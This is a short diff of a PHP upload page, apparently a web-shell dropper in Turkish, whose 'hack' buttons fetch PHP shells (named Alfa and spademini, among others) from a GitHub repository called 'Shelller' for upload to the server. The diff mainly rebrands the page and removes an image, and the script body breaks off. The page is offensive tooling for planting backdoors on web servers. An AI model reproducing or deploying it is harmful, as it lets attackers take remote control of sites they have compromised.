@@ -110,14 +110,14 @@
 </head>
 <body>
     <div class="upload-form">
-        <h2>Yükleme Formu</h2>
+        <h2>PatroeN Upload Form</h2>
         <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
             <p>Bir dosya seç ve avla :)</p>
             <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
             <input type="submit" value="Yükle">
         </form>
         <div class="message">
-            Poeice THS
+            Upload
         </div>
 <div class="hack-buttons">
     <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
@@ -128,7 +128,6 @@
     <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
 </div>
 <br>
-<img src="https://i.hizliresim.com/920h03s.png" style="width: 100%;">
 <script>
     function uploadFile(url) {
         // Get the form element
